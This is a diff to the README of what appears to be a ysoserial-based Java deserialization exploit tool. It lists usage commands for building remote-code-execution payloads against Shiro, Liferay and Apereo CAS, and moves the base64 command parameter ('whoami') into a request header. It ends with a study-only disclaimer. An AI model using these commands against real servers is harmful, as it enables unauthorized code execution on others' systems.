@@ -26,8 +26,7 @@ Usage: java -jar yso-echo-all.jar shiro_CommonsBeanutils1 win kPH+bIxk5D2deZiIxc
 Usage: java -jar yso-echo-all.jar liferay_CommonsBeanutils1 linux
 Usage: java -jar yso-echo-all.jar apereo_CommonsCollections2 linux
 
-[Add Request get/post parameter] c=d2hvYW1p (whoami)
-在get post 参数中加入 c=d2hvYW1p (whoami)
+[Add Request header] c: d2hvYW1p (whoami)
 ```
 
 ## 0x04 Screenshot
@@ -39,3 +38,6 @@ shiro spring环境回显
 * https://github.com/frohoff/ysoserial
 * https://www.freebuf.com/vuls/226149.html
 * https://www.00theway.org/2020/01/04/apereo-cas-rce/
+
+
+仅供学习研究使用，请勿用于非法用途
